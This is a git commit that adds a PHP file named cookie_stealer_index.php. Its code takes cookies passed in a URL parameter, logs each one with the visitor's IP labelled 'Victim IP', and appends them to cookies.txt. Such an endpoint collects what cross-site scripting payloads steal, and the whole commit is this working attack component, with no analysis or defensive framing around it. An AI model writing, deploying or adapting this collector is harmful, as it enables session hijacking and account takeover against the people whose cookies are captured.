451c92ff6a172b8d29802ea50f5dc72b9cd4c88a
PedroOrlando <101206218+LaPorota@users.noreply.github.com>
2023-07-24 16:33:10 -0300

    Create cookie_stealer_index.php

---
+++ cookie_stealer_index.php
@@ -0,0 +1,11 @@
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
